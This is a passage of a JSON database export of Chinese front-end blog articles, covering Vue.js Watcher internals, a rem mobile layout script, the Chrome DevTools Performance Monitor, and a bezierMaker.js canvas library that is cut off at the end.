\u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e: \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e metaSetter(newVal) {\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (newVal === val) \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e\n            val = newVal\n            childOb = Observer.create(newVal)\n            dep.notify()\n        }\n    })\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e可见, Watcher 把 Dep.target 设置成当前Watcher实例， 并主动调用了 getter，那么此时必然会进入 dep.depend() 函数。\ndep.depend() 实际执行了 Watcher.addDep() ：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eWatcher.prototype.addDep = \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (dep) {\n    var id = dep.id\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!this.newDeps[id]) {\n        this.newDeps[id] = dep\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!this.deps[id]) {\n            this.deps[id] = dep\n            dep.addSub(this)\n        }\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e可以看出，Watcher 把 dep 设置为当前实例的依赖，同时 dep 设置（添加）当前 Watcher为一个订阅者。至此完成了依赖收集。\n从上面 defineReactive 中的 setter 函数也可知道，当数据改变时，Dep 进行通知 (dep.notify()), 遍历所有的订阅者（Watcher）, 将其推入异步队列，使用订阅者的update方法，批量地更新DOM。\n至此 Watcher 的工作就完成了。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cul\u003e\n\u003cli\u003e实际上，Watcher的依赖收集机制也是实现 computed properties （ 计算属性）的基础；核心都是劫持 getter , 触发通知，收集依赖。\u003c/li\u003e\n\u003cli\u003eVue.js 初期对于计算属性，强制要求开发者设定 getter 方法，后期直接在 computed 属性中搞定，对开发者很友好。\u003c/li\u003e\n\u003cli\u003e推荐看一下这篇文章：数据的关联计算。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003eVue.js的其他黑魔法\u003c/h2\u003e\n\u003cp\u003e由于篇幅所限，本文讨论的内容主要在Observer, Compiler, Watcher 这些核心模块上；但实际上，Vue.js 源码（或历史源码）中还有大量的其他优秀实现，如：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ebatcher 异步队列\u003c/li\u003e\n\u003cli\u003ev-for 中的DOM diff算法\u003c/li\u003e\n\u003cli\u003eexp parser 曾经借鉴了 artTemplate 模板引擎\u003c/li\u003e\n\u003cli\u003etemplate parser 借鉴了 jquery\u003c/li\u003e\n\u003cli\u003etransition过渡系统设计\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e等等。其他的代码解耦、工程化、测试用例等也是非常好的学习例子。\n此外，如果是对 Vue.js 的源码演进过程比较熟悉的同学，就会发现 Vue.js 的核心思想是（借用尤大自己的表述）：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e“把高大上的思想变得平易近人”\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e从框架概念、开发体验、api设计、全家桶设计等多个方面，Vue.js 都不断地往友好和简洁方向努力，这也是现在这么火爆的原因吧。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e如何阅读开源项目的源码？\u003c/h2\u003e\n\u003cp\u003e最后，想把一些读源码的体验和各位同学分享：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e不要一上来就看最新版本的实现，因为很难看懂。反而去看最初的实现，容易了解作者的核心理念。\u003c/li\u003e\n\u003cli\u003e带着问题和测试用例去看源码。\u003c/li\u003e\n\u003cli\u003e多使用调试工具，跑各种测试流程，光看就能看懂…除非你是人肉编译机。\u003c/li\u003e\n\u003cli\u003e找一个（或多个）小伙伴和你一起看源码，多交流，效果比一个人好很多。\u003c/li\u003e\n\u003cli\u003e持之以恒，如果不保持阅读持续性，很容易遗忘和失去学习兴趣。\u003c/li\u003e\n\u003cli\u003e持续性地总结，好记性不如烂笔头，真正从你自己总结出来的，才是被你吸收的知识。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e以上，共勉。\u003c/p\u003e\n","buildTime":"1514979771.91","__v":0}
{"_id":{"$oid":"5a4cc38785472a29ac40335e"},"id":"5a430b216fb9a045263bdc00","author":{"$oid":"5a4cc38785472a29ac40334f"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"一稿设计多端适配优雅的解决方案 - rem ","meta":{"likeCount":0},"tag":[],"comment":[],"shortContent":"为提高前端团队开发效率，输出高质量的前端页面代码，提高UI设计还原度，特编写该规范文档。本文档如有不对或者不合适的地方请及时提出。 ui设计师设计界面时建议以iphone6的两倍尺寸（750px）为设计标准尺寸，前端开发在开发页面先引用上述代码块，前端开发在选择标注时仍按照标准…","content":"\u003cblockquote\u003e\n\u003cp\u003e规范目的\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e为提高前端团队开发效率，输出高质量的前端页面代码，提高UI设计还原度，特编写该规范文档。本文档如有不对或者不合适的地方请及时提出。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eJS代码块\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e（\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (doc, win) {\n    var docEl = doc.documentElement,\n        resizeEvt = \u003cspan class=\"hljs-string\"\u003e'orientationchange'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e window ? \u003cspan class=\"hljs-string\"\u003e'orientationchange'\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e'resize'\u003c/span\u003e,\n        recalc = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e () {\n            var clientWidth = docEl.clientWidth;\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!clientWidth) \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e;\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (clientWidth \u0026gt;= 750) {\n                docEl.style.fontSize = \u003cspan class=\"hljs-string\"\u003e'100px'\u003c/span\u003e;\n            } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n                docEl.style.fontSize = 100 * (clientWidth / 750) + \u003cspan class=\"hljs-string\"\u003e'px'\u003c/span\u003e;\n            }\n        };\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!doc.addEventListener) \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e;\n    win.addEventListener(resizeEvt, recalc, \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e);\n    doc.addEventListener(\u003cspan class=\"hljs-string\"\u003e'DOMContentLoaded'\u003c/span\u003e, recalc, \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e);\n})(document, window);\n\u003c/code\u003e\u003c/pre\u003e\u003cblockquote\u003e\n\u003cp\u003e使用方法\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eui设计师设计界面时建议以iphone6的两倍尺寸（750px）为设计标准尺寸，前端开发在开发页面先引用上述代码块，前端开发在选择标注时仍按照标准px来标注，为了计算方便js代码块中乘以100，在css中为实际尺寸只／100（rem）。\u003c/p\u003e\n\u003cp\u003e如图：标题栏在标注中高度为88px在页面css里实际为88/100=0.88rem\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/27/16095e3baceab768?w=664\u0026amp;h=410\u0026amp;f=png\u0026amp;s=78730\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e注意事项\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003e如果设计稿尺寸为其他则代码块要做相应修改。\u003c/li\u003e\n\u003cli\u003e此适配方法只适合在移动端开发前端web页面。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e参考文档\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"http://23jt.net/kun/?post=28\"\u003e移动端网页字体单位rem详解\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n","buildTime":"1514974941.5718","__v":0}
{"_id":{"$oid":"5a4cc38785472a29ac403360"},"id":"5a37b2f56fb9a0451e3fe73d","author":{"$oid":"5a4cc38785472a29ac403353"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/18/16069939e5ca2b54?w=532\u0026h=482\u0026f=png\u0026s=31961","https://user-gold-cdn.xitu.io/2017/12/18/16069939e9b62c34?w=800\u0026h=580\u0026f=gif\u0026s=2492133","https://user-gold-cdn.xitu.io/2017/12/17/1606485cac9627b6?w=972\u0026h=424\u0026f=gif\u0026s=4926541"],"screenShot":null}],"title":"Chrome DevTools - 性能监控 ","meta":{"likeCount":0},"tag":["前端","掘金翻译计划","Chrome"],"comment":[],"shortContent":"当然，你可以使用时间轴来记录，但是在大多数情况下，时间轴只记录数据，并不是实时更新的。在这点还有其他的性能测量技巧，Chrome DevTools 添加了 “Performance Monitor（性能监控）” 选项卡，可以体现实时性能： 这里有很多不同的性能选项，大部分都是非…","content":"\u003cblockquote\u003e\n\u003cul\u003e\n\u003cli\u003e原文地址：\u003ca target=\"_blank\" href=\"https://hospodarets.com/chrome-devtools-performance-monitor?utm_source=SitePoint\u0026amp;utm_medium=email\u0026amp;utm_campaign=Versioning\"\u003eChrome DevTools- Performance monitor\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e原文作者：\u003ca target=\"_blank\" href=\"https://twitter.com/malyw\"\u003emalyw\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e译文出自：\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner\"\u003e掘金翻译计划\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e本文永久链接：\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner/blob/master/TODO/chrome-devtools-performance-monitor.md\"\u003ehttps://github.com/xitu/gold-miner/blob/master/TODO/chrome-devtools-performance-monitor.md\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e译者：\u003ca target=\"_blank\" href=\"https://github.com/sunshine940326\"\u003eCherry\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e校对者：\u003ca target=\"_blank\" href=\"https://github.com/yanyixin\"\u003e萌萌\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/noahziheng\"\u003enoahziheng\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/blockquote\u003e\n\u003ch1 class=\"heading\"\u003eChrome DevTools - 性能监控\u003c/h1\u003e\n\u003cp\u003e你是否经常需要 JavaScript 或者 CSS 进行优化，但是不能找到一个简单的方式来衡量优化的效果？\u003c/p\u003e\n\u003cp\u003e当然，你可以使用时间轴来记录，但是在大多数情况下，时间轴只记录数据，并不是实时更新的。在这点还有其他的性能测量技巧，Chrome DevTools 添加了 “Performance Monitor（性能监控）” 选项卡，可以体现实时性能：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/18/16069939e5ca2b54?w=532\u0026amp;h=482\u0026amp;f=png\u0026amp;s=31961\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e这些都是在 Chrom 稳定版本中可用的并且可以进行以下性能监控：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e打开 URL：“chrome://flags/#enable-devtools-experiments”\u003c/li\u003e\n\u003cli\u003e将 “Developer Tools experiments” 选项设置为“启用”\u003c/li\u003e\n\u003cli\u003e点击 “Relaunch now” 来重启 Chrome\u003c/li\u003e\n\u003cli\u003e打开 Chrome DevTools (快捷键为 CMD/CTRL + SHIFT + I)\u003c/li\u003e\n\u003cli\u003e打开 DevTools “Setting” -\u0026gt; “Experiments” 选项\u003c/li\u003e\n\u003cli\u003e点击 6 次 \u003ccode\u003eSHIFT\u003c/code\u003e 显示隐藏的选项\u003c/li\u003e\n\u003cli\u003e选中 “Performance Monitor” 选项\u003c/li\u003e\n\u003cli\u003e重启 DevTools (快捷键 CMD/CTRL + SHIFT + I )\u003c/li\u003e\n\u003cli\u003e点击 “Esc” 打开附加面板\u003c/li\u003e\n\u003cli\u003e选择 “Performance monitor”\u003c/li\u003e\n\u003cli\u003e单击启用/禁用\u003c/li\u003e\n\u003cli\u003e开始使用性能监控吧 😀\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/18/16069939e9b62c34?w=800\u0026amp;h=580\u0026amp;f=gif\u0026amp;s=2492133\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e这里有很多不同的性能选项，大部分都是非常实用的并且我们在 Chrome 中用一些方法进行度量（例如时间轴，性能选项等）。\u003c/p\u003e\n\u003cp\u003e但是我想要分享一些新内容：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e“Layouts / sec” 和\u003c/li\u003e\n\u003cli\u003e“Style recalcs / sec”\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e允许你实时的检测你的 CSS 性能，例如：\u003c/p\u003e\n\u003cp\u003e感谢 \u003ca target=\"_blank\" href=\"https://csstriggers.com/\"\u003ecsstriggers.com\u003c/a\u003e，我们知道，改变 CSS 的 \u003ca target=\"_blank\" href=\"https://csstriggers.com/top\"\u003e\u003ccode\u003etop\u003c/code\u003e\u003c/a\u003e 和 \u003ca target=\"_blank\" href=\"https://csstriggers.com/left\"\u003e\u003ccode\u003eleft\u003c/code\u003e\u003c/a\u003e 属性会触发整个像素渲染流程：绘制，布局和组合。如果我们将这些属性用于动画，它将每秒触发几十次/上百次操作。\u003c/p\u003e\n\u003cp\u003e但是如果你使用 CSS 的 \u003ccode\u003etransform\u003c/code\u003e 属性的 \u003ccode\u003etranslateX/Y\u003c/code\u003e 来切换动画，你将会发现，\u003ca target=\"_blank\" href=\"https://csstriggers.com/top\"\u003e这并不会触发绘制和布局，仅仅会触发组合这一阶段\u003c/a\u003e，因为这是基于 GPU 的，会将你的 CPU 使用率降低为基本为 0%。\u003c/p\u003e\n\u003cp\u003e所有的这些都在 Paul Irish 的文章 \u003ca target=\"_blank\" href=\"https://www.paulirish.com/2012/why-moving-elements-with-translate-is-better-than-posabs-topleft/\"\u003e为什么使用 Translate() 移动元素优于 Top/left\u003c/a\u003e。为了测量差异，Paul 使用“时间轴”，展示了触发绘制和布局动作。但是近些年，Paul 正在致力于使用 Chrome DevTools 进行改良，这并不令人惊讶，我们终于有了一个合适的方法来衡量实时 CSS 性能。（我 fork 了他动画切换的示例代码）\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/17/1606485cac9627b6?w=972\u0026amp;h=424\u0026amp;f=gif\u0026amp;s=4926541\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/malyw/pen/QOQvyz\"\u003e示例\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e一般来说，Chrome 中的性能监视器有很多用途。现在，你可以获得实时的应用程序性能数据啦。\u003c/p\u003e\n\u003chr\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner\"\u003e掘金翻译计划\u003c/a\u003e 是一个翻译优质互联网技术文章的社区，文章来源为 \u003ca target=\"_blank\" href=\"https://juejin.im\"\u003e掘金\u003c/a\u003e 上的英文分享文章。内容覆盖 \u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#android\"\u003eAndroid\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#ios\"\u003eiOS\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E5%89%8D%E7%AB%AF\"\u003e前端\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E5%90%8E%E7%AB%AF\"\u003e后端\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E5%8C%BA%E5%9D%97%E9%93%BE\"\u003e区块链\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E4%BA%A7%E5%93%81\"\u003e产品\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E8%AE%BE%E8%AE%A1\"\u003e设计\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD\"\u003e人工智能\u003c/a\u003e等领域，想要查看更多优质译文请持续关注 \u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner\"\u003e掘金翻译计划\u003c/a\u003e、\u003ca target=\"_blank\" href=\"http://weibo.com/juejinfanyi\"\u003e官方微博\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://zhuanlan.zhihu.com/juejinfanyi\"\u003e知乎专栏\u003c/a\u003e。\u003c/p\u003e\n\u003c/blockquote\u003e\n","buildTime":"1514980167.1894","__v":0}
{"_id":{"$oid":"5a4cc38785472a29ac40335f"},"id":"5a450dcdf265da43305ec65a","author":{"$oid":"5a4cc38785472a29ac403348"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/28/1609dd9cafd3285c?w=816\u0026h=648\u0026f=gif\u0026s=3166147","https://user-gold-cdn.xitu.io/2017/12/29/1609ddad42cc4530?w=822\u0026h=654\u0026f=gif\u0026s=4792798"],"screenShot":null}],"title":"bezierMaker.js——N阶贝塞尔曲线生成器","meta":{"likeCount":0},"tag":["开源","Canvas"],"comment":[],"shortContent":"由于原生的Canvas最高只支持到三阶贝塞尔曲线，那么我想添加多个控制点怎么办呢？（即便大部分复杂曲线都可以用3阶贝塞尔来模拟）与此同时，关于贝塞尔控制点的位置我们很难非常直观的清楚到底将控制点设置为多少可以形成我们想要的曲线。本着解决以上两个痛点同时社区内好像并没有N阶的解决…","content":"\u003ch2 class=\"heading\"\u003e写在最前\u003c/h2\u003e\n\u003cp\u003e由于原生的Canvas最高只支持到三阶贝塞尔曲线，那么我想添加多个控制点怎么办呢？（即便大部分复杂曲线都可以用3阶贝塞尔来模拟）与此同时，关于贝塞尔控制点的位置我们很难非常直观的清楚到底将控制点设置为多少可以形成我们想要的曲线。\u003cstrong\u003e本着解决以上两个痛点同时社区内好像并没有N阶的解决方案（js版）故这次作者非常认真的开源了bezierMaker.js！\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ebezierMaker.js理论上支持N阶贝塞尔曲线的生成，同时提供了\u003ca target=\"_blank\" href=\"https://aaaaaaaty.github.io/bezierMaker.js/playground/playground.html\"\u003e试验场\u003c/a\u003e供开发者可以自行添加并拖拽控制点最终生成一组绘制动画。非常直观的让开发者知道不同位置的控制点所对应的不同生成曲线。\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e如果你喜欢这个作品欢迎\u003cstrong\u003eStar\u003c/strong\u003e，毕竟\u003cstrong\u003estar\u003c/strong\u003e来之不易。。\u003c/p\u003e\n\u003cp\u003e项目地址：\u003ca target=\"_blank\" href=\"https://github.com/Aaaaaaaty/bezierMaker.js\"\u003e这里✨✨✨\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e欢迎关注\u003ca target=\"_blank\" href=\"https://github.com/Aaaaaaaty/Blog\"\u003e我的博客\u003c/a\u003e，不定期更新中——\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e为什么需要一个试验场？\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e在绘制复杂的高阶贝塞尔曲线时无法知道自己需要的曲线的控制点的精确位置。在试验场中进行模拟，可以实时得到控制点的坐标值，将得到的点坐标变为对象数组传递进BezierMaker类就可以生成目标曲线\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e效果图\u003c/h3\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609dd9cafd3285c?w=816\u0026amp;h=648\u0026amp;f=gif\u0026amp;s=3166147\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/29/1609ddad42cc4530?w=822\u0026amp;h=654\u0026amp;f=gif\u0026amp;s=4792798\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e功能\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e[x] 试验场可添加任意数量控制点\u003c/li\u003e\n\u003cli\u003e[x] 试验场支持展示曲线绘制的形成动画\u003c/li\u003e\n\u003cli\u003e[x] 控制点可自由拖拽\u003c/li\u003e\n\u003cli\u003e[x] 支持显示贝塞尔曲线形成过程的切线\u003c/li\u003e\n\u003cli\u003e[x] 3阶及以下贝塞尔曲线的绘制采用原生API\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 class=\"heading\"\u003e引入\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;script src=\u003cspan class=\"hljs-string\"\u003e\"./bezierMaker.js\"\u003c/span\u003e\u0026gt;\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e绘制\u003c/h3\u003e\n\u003cp\u003e上面的效果图为试验场的使用，当你通过试验场获得控制点的准确坐标之后，就可以调用bezierMaker.js进行曲线的直接绘制。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e/**\n * canvas canvas的dom对象\n * bezierCtrlNodesArr 控制点数组，包含x，y坐标\n * color 曲线颜色\n */\nvar canvas = document.getElementById(\u003cspan class=\"hljs-string\"\u003e'canvas'\u003c/span\u003e)\n//3阶之前采用原生方法实现\nvar arr0 = [{x:70,y:25},{x:24,y:51}]\nvar arr1 = [{x:233,y:225},{x:170,y:279},{x:240,y:51}]\nvar arr2 = [{x:23,y:225},{x:70,y:79},{x:40,y:51},{x:300, y:44}]\nvar arr3 = [{x:333,y:15},{x:70,y:79},{x:40,y:551},{x:170,y:279},{x:17,y:239}]\nvar arr4 = [{x:53,y:85},{x:170,y:279},{x:240,y:551},{x:70,y:79},{x:40,y:551},{x:170,y:279}]\nvar bezier0 = new BezierMaker(canvas, arr0, \u003cspan class=\"hljs-string\"\u003e'black'\u003c/span\u003e)\nvar bezier1 = new BezierMaker(canvas, arr1, \u003cspan class=\"hljs-string\"\u003e'red'\u003c/span\u003e)\nvar bezier2 = new BezierMaker(canvas, arr2, \u003cspan class=\"hljs-string\"\u003e'blue'\u003c/span\u003e)\nvar bezier3 = new BezierMaker(canvas, arr3, \u003cspan class=\"hljs-string\"\u003e'yellow'\u003c/span\u003e)\nvar bezier4 = new BezierMaker(canvas, arr4, \u003cspan class=\"hljs-string\"\u003e'green'\u003c/span\u003e)\nbezier0.drawBezier()\nbezier1.drawBezier()\nbezier2.drawBezier()\nbezier3.drawBezier()\nbezier4.drawBezier()\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e绘制结果\u003c/h3\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609dbd2b21fc247?w=465\u0026amp;h=375\u0026amp;f=png\u0026amp;s=20485\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e当控制点少于3个时，会适配使用原生的API接口。当控制点多于2个后，由我们自己实现的函数进行描点绘制。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e核心原理\u003c/h2\u003e\n\u003ch4 class=\"heading\"\u003e绘制贝塞尔曲线\u003c/h4\u003e\n\u003cp\u003e绘制贝塞尔曲线的核心点在于贝塞尔公式的运用：\n\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"7460499-2603066c32c19ba9\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609dbd2b1e9db2e?w=700\u0026amp;h=53\u0026amp;f=png\u0026amp;s=25060\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n这个公式中的P0-Pn代表了从起点到各个控制点再到终点的各点与占比t的各种幂运算。\u003cp\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eBezierMaker.prototype.bezier = \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(t) { //贝塞尔公式调用\n    var x = 0,\n        y = 0,\n        bezierCtrlNodesArr = this.bezierCtrlNodesArr,\n        //控制点数组\n        n = bezierCtrlNodesArr.length - 1,\n        self = this\n    bezierCtrlNodesArr.forEach(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(item, index) {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(!index) {\n            x += item.x * Math.pow(( 1 - t ), n - index) * Math.pow(t, index) \n            y += item.y * Math.pow(( 1 - t ), n - index) * Math.pow(t, index) \n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        //factorial为阶乘函数\n            x += self.factorial(n) / self.factorial(index) / self.factorial(n - index) * item.x * Math.pow(( 1 - t ), n - index) * Math.pow(t, index) \n            y += self.factorial(n) / self.factorial(index) / self.factorial(n - index) * item.y * Math.pow(( 1 - t ), n - index) * Math.pow(t, index) \n        }\n    })\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e {\n        x: x,\n        y: y\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e对所有点进行遍历同时根据当前占比t的值(0\u0026lt;=t\u0026lt;=1)，计算出当前在贝塞尔曲线上的点坐标x,y。t的取值作者分成了1000份，即每次运算t+=0.01。此时算出的x,y即所求的贝塞尔曲线分成了1000份之后的某一点。当t值从0~1遍历1000次后生成1000个x,y对应坐标，依次描点画线即可模拟出高阶贝塞尔曲线。\u003c/p\u003e\n\u003cp\u003e对于贝塞尔公式的推导作者会在之后的文章中专门说明，现在你只需要知道我们通过贝塞尔公式计算出实际贝塞尔曲线被等分成了1000份的各点，用直线连接各点后即可模拟出类曲线。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e对于模拟场贝塞尔曲线生成动画的实现\u003c/h4\u003e\n\u003cp\u003e这个部分相关代码可以参考\u003ca target=\"_blank\" href=\"https://github.com/Aaaaaaaty/bezierMaker.js/blob/061721833d7236949be7d5d496ac51c3a198963b/playground/playground.js#L154\"\u003e这里\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e整体思路是\u003cstrong\u003e用递归的方式来将每个一层控制点当做1阶贝塞尔函数来计算下一层控制点并对应连\u003c/strong\u003e线。具体逻辑作者会留到深入讲解贝塞尔曲线公式原理的时候一起梳理一下试验场的动画生成原理~\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e小结\u003c/h3\u003e\n\u003cp\u003e作者一直想开源一些东西（但是菜，也没啥能写的），然而平时会用到的都被人写了，再造轮子也没别人写得好。这次也算是发现了一个貌似空白一些的区域。所以非常郑重的决定开源。贝塞尔的高级运用在gayhub中大多是安卓的实现，前端领域中还有很多地方可以更多的展开，欢迎讨论~ 多多批评！\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e其他canvas相关文章\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/Aaaaaaaty/Blog/issues/34\"\u003e基于canvas使用粒子拼出你想要的文字[2]——粒子的动画效果\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/Aaaaaaaty/Blog/issues/32\"\u003e基于canvas使用粒子拼出你想要的文字\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/Aaaaaaaty/Blog/issues/31\"\u003e基于canvas使用贝塞尔曲线平滑拟合折线段\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/Aaaaaaaty/Blog/issues/30\"\u003e用canvas实现视频播放与弹幕功能\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/Aaaaaaaty/Blog/issues/12\"\u003e基于canvas实现波浪式绘制图片\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/Aaaaaaaty/Blog/issues/5\"\u003e基于 canvas 实现的一个截图小 demo\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 